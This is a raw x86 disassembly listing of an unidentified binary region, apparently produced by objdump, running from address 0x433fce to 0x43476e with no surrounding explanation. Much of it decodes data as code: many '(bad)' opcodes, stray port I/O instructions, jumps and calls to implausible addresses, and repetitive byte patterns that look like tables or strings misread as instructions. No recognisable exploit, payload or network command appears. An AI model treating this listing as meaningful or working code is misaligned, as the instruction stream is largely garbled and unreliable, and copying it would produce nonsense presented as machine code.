  433fce:	push   ecx
  433fcf:	mov    dl,BYTE PTR [ecx-0xd]
  433fd2:	xor    ecx,DWORD PTR [ebp-0x45]
  433fd5:	(bad)  
  433fd7:	rol    BYTE PTR [eax],0xc1
  433fda:	ret    
  433fdb:	inc    ebp
  433fdc:	inc    ebp
  433fdd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433fe3:	xor    eax,ebx
  433fe5:	add    eax,DWORD PTR [ebp+0x23]
  433fe8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433fee:	cmp    edi,0xc
  433ff1:	dec    ebp
  433ff2:	inc    ebp
  433ff3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433ff9:	inc    ebp
  433ffa:	mov    esi,DWORD PTR [ebx]
  433ffc:	clc    
  433ffd:	lea    eax,[ebp+0x45725407]
  434003:	add    BYTE PTR [ebp+eax*2-0x75],dh
  434007:	xor    edi,DWORD PTR [eax]
  434009:	mov    ecx,0xff8b8d4d
  43400e:	push   esp
  43400f:	enter  0x4df7,0x23
  434013:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  434019:	mov    eax,DWORD PTR [ebx]
  43401b:	loopne 0x434008
  43401d:	ret    0xc68b
  434020:	push   esp
  434021:	enter  0x9745,0x8b
  434025:	inc    ebp
  434026:	cld    
  434027:	mov    eax,edi
  434029:	clc    
  43402a:	ret    
  43402b:	ret    0xc645
  43402e:	mov    esi,DWORD PTR [ebx]
  434030:	cld    
  434031:	pop    esi
  434032:	mov    ebx,0x83458bc3
  434038:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43403c:	dec    ebp
  43403d:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  434045:	clc    
  434046:	fcom   DWORD PTR [ebp+0x45]
  434049:	mov    edi,DWORD PTR [eax]
  43404b:	adc    al,0x9c
  43404d:	inc    ebp
  43404e:	(bad)  
  43404f:	mov    ebx,eax
  434051:	adc    al,0x85
  434053:	cmp    al,0x1
  434056:	inc    ebp
  434057:	add    BYTE PTR [edx],bh
  434059:	dec    ebp
  43405a:	pushf  
  43405b:	mov    ebp,ecx
  43405d:	mov    eax,DWORD PTR [ebx]
  43405f:	nop
  434060:	add    BYTE PTR [eax],al
  434062:	inc    ebp
  434063:	mov    esi,DWORD PTR [ebx]
  434065:	add    eax,DWORD PTR [ebx]
  434067:	cmp    al,0x89
  434069:	mov    esp,esi
  43406b:	clc    
  43406c:	inc    ebp
  43406d:	inc    ebp
  43406e:	add    edx,DWORD PTR [esi+0xc]
  434071:	mov    edi,0x7ff0845
  434076:	in     al,dx
  434077:	(bad)  
  434078:	jne    0x434013
  43407a:	mov    esi,DWORD PTR [edx]
  43407c:	clc    
  43407d:	add    ebp,DWORD PTR [esi]
  43407f:	mov    edi,edi
  434081:	in     al,dx
  434082:	mov    DWORD PTR [ebp-0x10],eax
  434085:	xor    eax,DWORD PTR [ebp+0x3]
  434088:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  434090:	(bad)  
  434091:	push   eax
  434092:	ret    
  434093:	call   0xd4ffca25
  434098:	call   0xffcf38e2
  43409d:	cmp    BYTE PTR [ebp+0x4d],al
  4340a0:	test   DWORD PTR [eax+0x74],ecx
  4340a3:	inc    ecx
  4340a4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4340aa:	ret    
  4340ab:	inc    eax
  4340ac:	dec    DWORD PTR [ebx+0x4945f8f0]
  4340b2:	push   eax
  4340b3:	dec    eax
  4340b4:	test   al,0xd0
  4340b6:	dec    eax
  4340b8:	mov    eax,DWORD PTR [ebp-0x14]
  4340bb:	mov    eax,DWORD PTR [ebp+0x38]
  4340be:	mov    eax,ecx
  4340c0:	fadd   DWORD PTR [ebx]
  4340c2:	dec    ebp
  4340c3:	inc    eax
  4340c4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4340ca:	inc    ebp
  4340cb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4340d1:	fadd   QWORD PTR [ebx]
  4340d3:	inc    ebp
  4340d4:	or     al,0x33
  4340d6:	dec    ebp
  4340d7:	add    edi,DWORD PTR [ebx]
  4340d9:	mov    DWORD PTR [edx-0x28],esi
  4340dc:	mov    eax,DWORD PTR [ebp-0x10]
  4340df:	mov    eax,DWORD PTR [eax+0x10]
  4340e2:	mov    eax,edi
  4340e4:	lock ret 
  4340e6:	inc    ecx
  4340e7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  4340ed:	fsubr  st,st(5)
  4340ef:	test   DWORD PTR [eax],eax
  4340f1:	clc    
  4340f2:	push   0x45
  4340f4:	(bad)  
  4340f5:	cmp    ebp,esp
  4340f7:	pushf  
  4340f8:	inc    ebp
  4340f9:	(bad)  
  4340fa:	push   eax
  4340fb:	fsub   DWORD PTR [eax-0x7b]
  4340fe:	(bad)  
  4340ff:	clc    
  434100:	mov    eax,0xf8008584
  434105:	mov    eax,DWORD PTR [ebp-0x4]
  434108:	mov    edi,0x4585c3cc
  43410e:	clc    
  43410f:	mov    eax,DWORD PTR [ebp+0x14]
  434112:	cmp    BYTE PTR [ebp-0x64],al
  434115:	mov    edi,eax
  434117:	in     al,dx
  434118:	les    esi,FWORD PTR [ebp-0x7b]
  43411b:	mov    edi,eax
  43411d:	or     al,0x4d
  43411f:	dec    ebp
  434120:	mov    eax,ebp
  434122:	in     al,0xf2
  434124:	dec    ebp
  434125:	dec    DWORD PTR [ecx+0x4dc7e045]
  43412b:	fmul   DWORD PTR [ecx+0x4df8f085]
  434131:	inc    ebp
  434132:	mov    DWORD PTR [ebx],esi
  434134:	fadd   QWORD PTR [ebx]
  434136:	dec    ebp
  434137:	push   eax
  434138:	xor    eax,DWORD PTR [ebp+0x3]
  43413b:	push   eax
  43413c:	mov    DWORD PTR [eax+ebx*8],ebx
  43413f:	push   esi
  434141:	mov    eax,DWORD PTR [eax]
  434143:	lock cmp eax,0xf84e85c0
  434149:	inc    ebp
  43414a:	test   BYTE PTR [ebx],dh
  43414c:	add    DWORD PTR [ebx],eax
  43414e:	add    BYTE PTR [eax+0x4d],dl
  434151:	jne    0x434186
  434153:	lea    ecx,[ebx-0x7617fc44]
  434159:	div    ah
  43415b:	inc    DWORD PTR [ebp+0x45]
  43415e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  434164:	jb     0x4340f1
  434166:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43416d:	mov    ecx,DWORD PTR [ebp-0x10]
  434170:	xor    ecx,DWORD PTR [ebp+0x3]
  434173:	mov    edi,DWORD PTR [ebx]
  434175:	adc    BYTE PTR [ebp+0x41],dh
  434178:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43417e:	ret    
  43417f:	push   ss
  434180:	push   0x45
  434182:	lea    ecx,[ebx+0x4de80cb0]
  434188:	sti    
  434189:	add    edi,edi
  43418b:	or     BYTE PTR [ebp+0x4d],al
  43418e:	mov    ebp,DWORD PTR [ebx]
  434190:	xor    ebp,ecx
  434192:	mov    al,BYTE PTR [edx]
  434194:	add    eax,0xc7200
  434199:	jne    0x4341e8
  43419b:	lea    esi,[ebx]
  43419d:	mov    al,0xf
  43419f:	call   0xf3864
  4341a4:	shl    DWORD PTR [esi],0x84
  4341a7:	pushf  
  4341a8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4341ae:	mov    edi,DWORD PTR [ecx]
  4341b0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4341b7:	test   DWORD PTR [eax],eax
  4341b9:	clc    
  4341ba:	dec    ebp
  4341bb:	inc    ebp
  4341bc:	xor    edi,DWORD PTR [ebx]
  4341be:	setl   al
  4341c1:	(bad)  
  4341c2:	retf   
  4341c3:	rol    cl,1
  4341c5:	dec    ebp
  4341c6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4341cc:	inc    ebp
  4341cd:	lea    ecx,[ebx-0x75b2cc38]
  4341d3:	lea    eax,ds:0x4d72c4
  4341d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4341dc:	xor    ecx,edi
  4341de:	bswap  ebx
  4341e0:	ror    BYTE PTR [ebp-0x35],0xe9
  4341e4:	rol    DWORD PTR [ecx],0x84
  4341e7:	add    BYTE PTR [ecx],al
  4341e9:	cmp    BYTE PTR [eax],al
  4341eb:	pushf  
  4341ec:	inc    ebp
  4341ed:	jnp    0x8a4375f0
  4341f3:	mov    eax,DWORD PTR ds:0xcf72e8
  4341f9:	lock dec ebp
  4341fb:	retf   
  4341fc:	xor    ecx,DWORD PTR [ebp+0xf]
  4341ff:	mov    eax,eax
  434201:	fmul   st,st(3)
  434203:	test   ecx,0x1998484
  434209:	xor    al,BYTE PTR [eax]
  43420b:	mov    DWORD PTR [ebp-0x28],eax
  43420e:	mov    eax,DWORD PTR [ebp+0x33]
  434211:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434217:	ret    
  434218:	add    al,cl
  43421a:	dec    ebp
  43421b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  434221:	add    ecx,DWORD PTR ds:0xc7250
  434227:	inc    ebp
  434228:	rcl    DWORD PTR [eax+0x4d],0x2b
  43422c:	mov    edi,edi
  43422e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  434234:	jb     0x4341fd
  434236:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  43423d:	mov    esi,DWORD PTR [ebx]
  43423f:	cld    
  434240:	mov    cl,bh
  434242:	or     eax,0x372b6
  434247:	cmp    ecx,eax
  434249:	jne    0x4342c6
  43424f:	mov    eax,DWORD PTR [ebp-0x20]
  434252:	mov    eax,DWORD PTR [eax]
  434254:	xor    eax,edi
  434256:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  43425d:	mov    ecx,DWORD PTR [ebp-0x4]
  434260:	mov    ecx,edi
  434262:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434268:	jb     0x434279
  43426a:	add    BYTE PTR [edi-0x3f],dl
  43426d:	add    BYTE PTR [ebp-0x75],cl
  434270:	mov    esi,eax
  434272:	xor    eax,DWORD PTR [eax]
  434274:	mov    al,bh
  434276:	or     eax,0x497284
  43427b:	xor    al,cl
  43427d:	mov    ecx,DWORD PTR [ebp-0x4]
  434280:	mov    ecx,edi
  434282:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434288:	jb     0x434299
  43428a:	add    BYTE PTR [edi],dh
  43428c:	enter  0x8500,0x8b
  434290:	add    ah,bl
  434292:	add    BYTE PTR [eax],al
  434294:	inc    ebp
  434295:	(bad)  
  434296:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43429d:	mov    esi,DWORD PTR [edx-0x4]
  4342a0:	add    bh,cl
  4342a2:	dec    ebp
  4342a3:	mov    dh,0x8b
  4342a5:	add    esi,DWORD PTR [ebx]
  4342a7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4342ad:	add    BYTE PTR [eax],al
  4342af:	mov    eax,ecx
  4342b1:	loopne 0x434300
  4342b3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4342b9:	dec    ecx
  4342ba:	or     eax,0x8b7232
  4342bf:	in     al,0xc1
  4342c1:	or     DWORD PTR [ebp-0x31],ecx
  4342c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  4342cb:	xor    dh,BYTE PTR [edx-0x75]
  4342ce:	add    al,dh
  4342d0:	enter  0x4f09,0xcf
  4342d4:	inc    ebp
  4342d5:	mov    WORD PTR [ebx-0x75cdccb7],cs
  4342db:	or     al,BYTE PTR ds:0xe4728b
  4342e1:	or     DWORD PTR [ebp-0x31],ecx
  4342e4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  4342eb:	cmp    dh,BYTE PTR [edx+0xf]
  4342ee:	add    bl,dl
  4342f0:	rol    DWORD PTR [eax],0x4d
  4342f3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4342f9:	(bad)  
  4342fa:	or     eax,0x497284
  4342ff:	xor    al,cl
  434301:	mov    ecx,DWORD PTR [ebp-0x20]
  434304:	mov    ecx,DWORD PTR [ecx]
  434306:	xor    ecx,edi
  434308:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43430f:	xor    cl,al
  434311:	mov    ecx,DWORD PTR [edi]
  434313:	fadd   QWORD PTR [ebp+0x9]
  434316:	call   0xffd03dea
  43431b:	dec    ecx
  43431c:	dec    ebp
  43431d:	xor    bh,BYTE PTR [ebx]
  43431f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  434323:	loopne 0x434321
  434325:	or     edi,eax
  434327:	iret   
  434328:	ret    
  434329:	mov    WORD PTR [ebp+0x4d],es
  43432c:	mov    esi,DWORD PTR [edx]
  43432e:	call   0x84530a6d
  434333:	(bad)  
  434334:	cdq    
  434335:	add    BYTE PTR [edx],dh
  434337:	mov    esi,DWORD PTR [ebx]
  434339:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43433f:	test   BYTE PTR [ebx],dh
  434341:	dec    ecx
  434342:	add    esi,DWORD PTR [edx]
  434344:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43434a:	dec    edi
  43434c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  434353:	xor    al,BYTE PTR [ebx]
  434355:	mov    edi,DWORD PTR [ebx]
  434357:	in     al,0x75
  434359:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43435f:	dec    ecx
  434360:	xor    esi,DWORD PTR [edx]
  434362:	lea    ecx,[edx]
  434364:	or     BYTE PTR [ebx+0x900f072],cl
  43436a:	ja     0x43433b
  43436c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  434373:	cmp    ch,al
  434375:	jne    0x43436a
  434377:	mov    edi,edi
  434379:	fadd   QWORD PTR [ebp+0x0]
  43437c:	mov    eax,edi
  43437e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434385:	mov    edx,DWORD PTR [ebx]
  434387:	in     al,0x45
  434389:	or     DWORD PTR [ebx],esi
  43438b:	iret   
  43438c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434393:	xor    dl,BYTE PTR [eax-0x75]
  434396:	sbb    al,0xe0
  434398:	dec    DWORD PTR [ecx]
  43439a:	mov    ecx,edi
  43439c:	in     al,dx
  43439d:	mov    eax,es
  43439f:	dec    ecx
  4343a0:	mov    DWORD PTR [edx],esi
  4343a2:	fmul   QWORD PTR [edx]
  4343a4:	jne    0x434331
  4343a6:	(bad)  
  4343a7:	(bad)  
  4343a9:	or     DWORD PTR [ebp-0x31],eax
  4343ac:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  4343b3:	cmp    bh,bh
  4343b5:	jne    0x4343fc
  4343b7:	lea    ecx,[ebx-0x38372750]
  4343bd:	inc    ebx
  4343bf:	mov    eax,ecx
  4343c1:	mov    eax,0xa00c111
  4343c6:	jne    0x43440d
  4343c8:	mov    esi,DWORD PTR [ebx]
  4343ca:	test   al,0x3
  4343cc:	inc    ebp
  4343cd:	mov    DWORD PTR [eax-0xc],edx
  4343d0:	loop   0x434417
  4343d2:	push   DWORD PTR [ebx]
  4343d4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4343da:	add    DWORD PTR [eax],eax
  4343dc:	mov    eax,edi
  4343de:	lods   al,BYTE PTR ds:[esi]
  4343df:	dec    ebp
  4343e0:	inc    ebp
  4343e1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4343e7:	retf   
  4343e8:	mov    edx,ecx
  4343ea:	adc    al,0x84
  4343ec:	(bad)  
  4343ed:	std    
  4343ee:	ret    
  4343ef:	jmp    FWORD PTR [edi-0x2b7474bb]
  4343f5:	hlt    
  4343f6:	rol    edi,0x82
  4343f9:	ret    
  4343fa:	cld    
  4343fb:	enter  0x11ff,0x45
  4343ff:	inc    ebp
  434400:	pop    edi
  434401:	mov    ebx,DWORD PTR [ebx+0x14]
  434404:	ret    0xc7
  434407:	test   BYTE PTR [ebx+0x45325199],cl
  43440d:	jmp    0x43439a
  43440f:	push   0x8
  434411:	call   DWORD PTR [esi]
  434413:	in     al,dx
  434414:	add    BYTE PTR [ebp+0x1],0x50
  434418:	add    bh,ah
  43441a:	add    bh,bh
  43441c:	icebp  
  43441d:	mov    ecx,DWORD PTR [eax]
  43441f:	cld    
  434420:	pop    es
  434421:	dec    ebp
  434422:	shl    DWORD PTR [ebx],0x72
  434425:	add    eax,DWORD PTR [eax]
  434427:	cmp    edx,ecx
  434429:	je     0x43443b
  43442b:	mov    esi,DWORD PTR [ebp-0x4]
  43442e:	inc    edi
  434430:	or     al,0xc3
  434432:	jmp    FWORD PTR [edx-0x18]
  434435:	(bad)  
  434436:	sti    
  434437:	cwde   
  434438:	(bad)  
  434439:	call   0xffa13d44
  43443e:	or     al,0x45
  434440:	push   ebp
  434441:	sub    esp,0x18
  434444:	push   ebx
  434445:	inc    ebp
  434446:	mov    edi,edi
  434448:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43444f:	test   al,0x51
  434451:	inc    ebp
  434452:	push   ecx
  434453:	push   eax
  434454:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43445a:	add    ah,bh
  43445c:	(bad)  
  43445d:	dec    ebp
  43445e:	add    DWORD PTR [ebx],esi
  434460:	inc    ebp
  434461:	add    ecx,DWORD PTR [ebx+0x74943b]
  434467:	push   0xffffff8b
  434469:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43446f:	add    eax,DWORD PTR [ecx]
  434471:	or     BYTE PTR [eax],al
  434473:	call   0xff853c78
  434478:	mov    eax,DWORD PTR [ebp+0x14]
  43447b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434481:	inc    ebp
  434482:	dec    ecx
  434483:	add    ebp,DWORD PTR [edx+0x14]
  434486:	push   0x8b3045
  43448b:	call   0x33ad9200
  434490:	inc    DWORD PTR [ebx]
  434492:	mov    DWORD PTR [edi],ecx
  434494:	mov    eax,ecx
  434496:	or     BYTE PTR [ebp-0x3d],cl
  434499:	cmp    eax,edi
  43449b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4344a0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4344a6:	adc    al,0xc9
  4344a8:	inc    ebp
  4344a9:	adc    BYTE PTR [eax+0x55],dl
  4344ac:	jne    0x43449a
  4344ae:	call   0xff54443e
  4344b3:	dec    ebp
  4344b4:	inc    ebp
  4344b5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4344bb:	add    BYTE PTR [ebx],bh
  4344bd:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4344c1:	push   ecx
  4344c2:	or     al,0x51
  4344c4:	dec    ebp
  4344c5:	xor    DWORD PTR [ebx],0xf320399
  4344cb:	cmp    eax,DWORD PTR [ebp+0x74]
  4344ce:	mov    edi,edi
  4344d0:	pop    edi
  4344d1:	adc    BYTE PTR [ebx+0x75],bl
  4344d4:	ret    0x50
  4344d7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4344db:	(bad)  
  4344dc:	clc    
  4344dd:	mov    esp,ebp
  4344df:	pop    ecx
  4344e0:	mov    ecx,0xf80085c2
  4344e5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4344e8:	push   esi
  4344e9:	push   esi
  4344ea:	(bad)  
  4344eb:	lock add eax,DWORD PTR [ebp+0x44]
  4344ef:	mov    edx,DWORD PTR [eax]
  4344f1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4344f5:	or     BYTE PTR [ecx+0x7],dl
  4344f8:	push   ecx
  4344f9:	ret    
  4344fa:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434500:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434506:	or     al,0x80
  434508:	jge    0x43450b
  43450a:	mov    DWORD PTR [eax],eax
  43450c:	and    al,0x8
  43450e:	cmp    DWORD PTR [ebp+0x10],eax
  434511:	mov    edx,DWORD PTR [esi]
  434513:	xchg   esp,eax
  434514:	dec    esp
  434515:	add    BYTE PTR [eax],dl
  434517:	mov    ecx,edx
  434519:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43451d:	dec    ebp
  43451e:	into   
  43451f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  434525:	mov    edx,DWORD PTR [eax+0x14]
  434528:	das    
  434529:	add    al,0x45
  43452b:	add    BYTE PTR [ebp+0x0],dh
  43452e:	mov    edi,edi
  434530:	and    al,0x50
  434532:	mov    eax,DWORD PTR [eax]
  434534:	and    al,0xd1
  434536:	xor    eax,DWORD PTR [esi]
  434538:	lea    eax,[ebp+0x8]
  43453b:	xor    esi,DWORD PTR [edx+0x3]
  43453e:	add    BYTE PTR [ecx+0x4510fc44],cl
  434544:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  43454a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  434554:	cmp    edi,edi
  434556:	pushf  
  434557:	mov    edi,edi
  434559:	or     BYTE PTR [esi+ecx*1],cl
  43455c:	jne    0x434521
  43455e:	call   0xc452a
  434563:	adc    BYTE PTR [ebp+eax*2+0xc],al
  434567:	mov    ebx,DWORD PTR [eax]
  434569:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43456d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  434575:	pop    esi
  434576:	(bad)  
  434577:	leave  
  434578:	call   DWORD PTR [eax]
  43457a:	call   DWORD PTR [ebp+0x24]
  43457d:	in     al,dx
  43457e:	jmp    esp
  434580:	and    al,0x83
  434582:	call   0xff7a4397
  434587:	pushf  
  434588:	inc    esp
  434589:	mov    DWORD PTR [esp],ecx
  43458c:	pop    esi
  43458d:	push   edi
  43458e:	in     eax,0x41
  434590:	ret    0x89
  434593:	and    al,0xe
  434595:	mov    edi,DWORD PTR [eax]
  434597:	and    al,0x75
  434599:	mov    edx,0x7750885
  43459e:	or     dl,bh
  4345a0:	call   FWORD PTR [ecx+0x3243224]
  4345a6:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  4345ac:	dec    DWORD PTR [esp]
  4345af:	jl     0x43453c
  4345b1:	adc    al,0xc
  4345b3:	dec    ebp
  4345b4:	cmp    DWORD PTR [ebp+0x1c],esi
  4345b7:	mov    ecx,DWORD PTR [eax]
  4345b9:	and    al,0x10
  4345bb:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  4345c2:	test   DWORD PTR [edi],ecx
  4345c4:	jge    0x434590
  4345c6:	push   0x8908ff4c
  4345cb:	jmp    0x4345f1
  4345cd:	adc    BYTE PTR [esp+eax*2-0x75],dh
  4345d1:	dec    esp
  4345d2:	pop    ebp
  4345d3:	ret    0x8999
  4345d6:	push   0x74f89cf8
  4345db:	jmp    0x434651
  4345dd:	mov    edi,0x104fd55f
  4345e2:	add    BYTE PTR [eax],dh
  4345e4:	adc    BYTE PTR ds:[eax],al
  4345e7:	or     edx,DWORD PTR gs:[eax]
  4345ea:	add    BYTE PTR [ecx],ch
  4345ec:	add    eax,0x35270010
  4345f1:	adc    BYTE PTR [eax],al
  4345f3:	std    
  4345f4:	dec    eax
  4345f5:	adc    BYTE PTR [eax],al
  4345f7:	(bad)  
  4345f8:	outs   dx,BYTE PTR ds:[esi]
  4345f9:	adc    BYTE PTR [eax],al
  4345fb:	sahf   
  4345fc:	xor    DWORD PTR [eax],edx
  4345fe:	add    BYTE PTR [esi+0x0],al
  434601:	adc    BYTE PTR [eax],al
  434603:	fs jae 0x434616
  434606:	add    BYTE PTR [ebx-0x20ffefac],bh
  43460c:	inc    ebp
  43460d:	inc    ebx
  43460e:	add    bl,ah
  434610:	inc    ebp
  434611:	inc    ebx
  434612:	add    bh,ah
  434614:	inc    ebp
  434615:	inc    ebx
  434616:	add    bl,ch
  434618:	inc    ebp
  434619:	inc    ebx
  43461a:	add    bh,ch
  43461c:	inc    ebp
  43461d:	inc    ebx
  43461e:	add    bl,dh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    bh,dh
  434624:	inc    ebp
  434625:	inc    ebx
  434626:	add    bl,bh
  434628:	inc    ebp
  434629:	inc    ebx
  43462a:	add    bh,bh
  43462c:	inc    ebp
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [ebx],al
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [edi],al
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  43463d:	adc    BYTE PTR [eax],al
  43463f:	adc    dh,BYTE PTR [ecx+0x10]
  434642:	add    BYTE PTR [edi+0x2c001065],al
  434648:	push   0x5aa20010
  43464d:	adc    BYTE PTR [eax],al
  43464f:	rol    DWORD PTR [eax+edx*1],0x0
  434653:	int    0x6f
  434655:	adc    BYTE PTR [eax],al
  434657:	aaa    
  434658:	inc    esi
  434659:	inc    ebx
  43465a:	add    BYTE PTR [ebx],bh
  43465c:	inc    esi
  43465d:	inc    ebx
  43465e:	add    BYTE PTR [edi],bh
  434660:	inc    esi
  434661:	inc    ebx
  434662:	add    BYTE PTR [ebx+0x46],al
  434665:	inc    ebx
  434666:	add    BYTE PTR [edi+0x46],al
  434669:	inc    ebx
  43466a:	add    BYTE PTR [ebx+0x46],cl
  43466d:	inc    ebx
  43466e:	add    BYTE PTR [edi+0x46],cl
  434671:	inc    ebx
  434672:	add    BYTE PTR [ebx+0x46],dl
  434675:	inc    ebx
  434676:	add    BYTE PTR [ebx+0x54001005],dh
  43467c:	push   ebp
  43467d:	adc    BYTE PTR [eax],al
  43467f:	sbb    bh,BYTE PTR [eax]
  434681:	adc    BYTE PTR [eax],al
  434683:	mov    edx,0x2f001013
  434688:	dec    edx
  434689:	adc    BYTE PTR [eax],al
  43468b:	inc    ecx
  43468c:	or     edx,DWORD PTR [eax]
  43468e:	add    BYTE PTR [ebx+0x19],ch
  434691:	adc    BYTE PTR [eax],al
  434693:	mov    esp,0x7700103e
  434698:	inc    esi
  434699:	inc    ebx
  43469a:	add    BYTE PTR [ebx+0x46],bh
  43469d:	inc    ebx
  43469e:	add    BYTE PTR [edi+0x46],bh
  4346a1:	inc    ebx
  4346a2:	add    BYTE PTR [ebx-0x78ffbcba],al
  4346a8:	inc    esi
  4346a9:	inc    ebx
  4346aa:	add    BYTE PTR [ebx-0x70ffbcba],cl
  4346b0:	inc    esi
  4346b1:	inc    ebx
  4346b2:	add    BYTE PTR [ebx-0x50ffbcba],dl
  4346b8:	push   0x10
  4346ba:	add    al,bl
  4346bc:	imul   edx,DWORD PTR [eax],0x0
  4346bf:	sahf   
  4346c0:	push   ss
  4346c1:	adc    BYTE PTR [eax],al
  4346c3:	jle    0x4346ff
  4346c5:	adc    BYTE PTR [eax],al
  4346c7:	jbe    0x4346de
  4346c9:	adc    BYTE PTR [eax],al
  4346cb:	cmp    DWORD PTR [edi+0x10],edx
  4346ce:	add    BYTE PTR [ebp+0x59001066],bl
  4346d4:	adc    al,0x10
  4346d6:	add    BYTE PTR [edi-0x44ffbcba],dh
  4346dc:	inc    esi
  4346dd:	inc    ebx
  4346de:	add    BYTE PTR [edi-0x3cffbcba],bh
  4346e4:	inc    esi
  4346e5:	inc    ebx
  4346e6:	add    bh,al
  4346e8:	inc    esi
  4346e9:	inc    ebx
  4346ea:	add    bl,cl
  4346ec:	inc    esi
  4346ed:	inc    ebx
  4346ee:	add    bh,cl
  4346f0:	inc    esi
  4346f1:	inc    ebx
  4346f2:	add    bl,dl
  4346f4:	inc    esi
  4346f5:	inc    ebx
  4346f6:	add    BYTE PTR [ebx-0x6affef90],bh
  4346fc:	inc    ebp
  4346fd:	adc    BYTE PTR [eax],al
  4346ff:	dec    ebx
  434700:	dec    eax
  434701:	adc    BYTE PTR [eax],al
  434703:	dec    ebx
  434704:	popa   
  434705:	adc    BYTE PTR [eax],al
  434707:	adc    al,BYTE PTR [eax+edx*1]
  43470a:	add    dh,dl
  43470c:	push   ds
  43470d:	adc    BYTE PTR [eax],al
  43470f:	hlt    
  434710:	pop    ds
  434711:	adc    BYTE PTR [eax],al
  434713:	dec    ecx
  434714:	pop    eax
  434715:	adc    BYTE PTR [eax],al
  434717:	test   DWORD PTR [esi+0x43],0x4346fb00
  43471e:	add    bh,bh
  434720:	inc    esi
  434721:	inc    ebx
  434722:	add    BYTE PTR [ebx],al
  434724:	inc    edi
  434725:	inc    ebx
  434726:	add    BYTE PTR [edi],al
  434728:	inc    edi
  434729:	inc    ebx
  43472a:	add    BYTE PTR [ebx],cl
  43472c:	inc    edi
  43472d:	inc    ebx
  43472e:	add    BYTE PTR [edi],cl
  434730:	inc    edi
  434731:	inc    ebx
  434732:	add    BYTE PTR [ebx],dl
  434734:	inc    edi
  434735:	inc    ebx
  434736:	add    BYTE PTR [ebp+0x57],cl
  434739:	xor    DWORD PTR [ecx],esi
  43473b:	cmp    BYTE PTR [edi+ebx*2],dh
  43473e:	push   ecx
  43473f:	add    BYTE PTR [edx+0x33],dl
  434742:	push   esi
  434743:	xor    eax,0x3849515f
  434748:	xor    al,0x59
  43474a:	push   edi
  43474b:	add    BYTE PTR [ebx+0x54],al
  43474e:	inc    ebp
  43474f:	pop    edi
  434750:	dec    ebx
  434751:	push   edx
  434752:	push   ebp
  434753:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  434758:	pop    edi
  434759:	aaa    
  43475a:	xor    al,0x32
  43475c:	xor    BYTE PTR [edi+0x5f],al
  43475f:	inc    ebx
  434760:	pop    edx
  434761:	add    BYTE PTR [edi+0x4e],al
  434764:	cmp    DWORD PTR [edi+0x47],ebx
  434767:	push   ebx
  434768:	cmp    DWORD PTR [edi+0x4e],edx
  43476b:	add    BYTE PTR [ecx+0x44],dl
  43476e:	cmp    BYTE PTR [edi+0x33],bl
